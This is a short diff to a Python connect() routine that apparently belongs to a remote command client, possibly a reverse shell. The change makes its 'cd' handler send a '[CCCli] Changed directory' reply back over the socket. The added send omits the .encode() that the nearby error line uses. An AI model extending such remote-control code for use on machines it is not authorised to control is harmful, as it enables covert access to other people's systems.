@@ -42,7 +42,8 @@ def connect():
 				pass
 		elif command[:2] == 'cd':
 			try:
-				modules.cd(command)
+				res = modules.cd(command)
+				s.send('[CCCli] Changed directory to {}'.format(res['path']))
 			except:
 				print('[ERROR] The system path cannot be found.')
 				s.send('[ERROR]'.encode())
